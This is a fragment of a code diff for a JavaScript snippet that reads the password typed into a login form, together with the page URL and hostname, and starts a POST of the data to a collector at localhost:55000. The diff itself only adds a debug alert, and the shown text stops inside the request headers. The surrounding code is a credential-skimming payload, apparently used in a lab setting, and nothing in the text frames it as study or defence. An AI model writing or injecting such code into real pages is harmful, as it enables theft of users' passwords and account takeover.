@@ -3,6 +3,8 @@ var passwd = document.getElementById("user_pass").value;
 var url = document.location.href;
 var origin = document.location.hostname;
 
+alert('debug');
+
 fetch("http://localhost:55000/data", {
   method: "POST",
   headers: {
